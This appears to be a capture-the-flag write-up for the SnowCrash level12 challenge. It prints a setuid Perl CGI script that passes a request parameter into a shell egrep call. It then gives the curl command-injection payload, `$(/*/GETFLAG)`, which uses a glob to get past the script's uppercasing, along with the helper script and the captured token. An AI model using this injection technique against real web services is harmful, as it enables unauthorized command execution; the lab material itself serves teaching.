# Level12

```bash
level12@SnowCrash:~$ ls -lA
total 16
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

```perl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

```bash
level12@SnowCrash:~$ curl 127.0.0.1:4646
..
```

```bash
level12@SnowCrash:~$ curl '127.0.0.1:4646?x=test&y=test2'
.
```

Once logged in with the level12 user, we are greeted by a basic perl script, all it did was:

- take 2 arguments in the http request: `x` & `y`
- execute some regex replacement to the parameters sent (replace lowercase by caps, and remove all but the first 'word')
- execute an `egrep` command on `/tmp/xd` to search for lines containing the content of `$xx`
- And we don't care of the rest because it wouldn't print the token in any way

### Exploit

The goal was to make the server run the getflag command without just sending it `getflag` in the `x` parameter as it would be replaced by `GETFLAG`, which does not exists.

Running the following command made the vm crash so I thought what I sent to the server was executed

```bash
level12@SnowCrash:~$ curl '127.0.0.1:4646?x=$(./*)&y=test2'
.
```

After rebooting the vm i tried with a script with a filename in caps that would execute `getflag` (in lowercase):
```bash
level12@SnowCrash:~$ nano /tmp/GETFLAG
#!/bin/bash
getflag >> /tmp/GETFLAG
exit 0
```

Gave permissions for the server to execute it:

```bash
level12@SnowCrash:~$ chmod 777 /tmp/GETFLAG
```

Then executed it with the following arguments:

```bash
level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x=$(/*/GETFLAG)&y=test2'
.
```

As the script name is already in caps, and we don't have any other word than the first one, the command is not modified by the regex expressions.

```bash
.level12@SnowCrash:~$ cat /tmp/GETFLAG
#!/bin/bash
getflag >> /tmp/GETFLAG
exit 0
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Note: the `*` here is important as passing `/tmp/GETFLAG` would result of the script executing `/TMP/GETFLAG`, but `/TMP` does not exists.

### Goto level13

```bash
level12@SnowCrash:/tmp$ su level13
Password: <<< 'g1qKMiRpXf53AWhDaU7FEkczr'
```
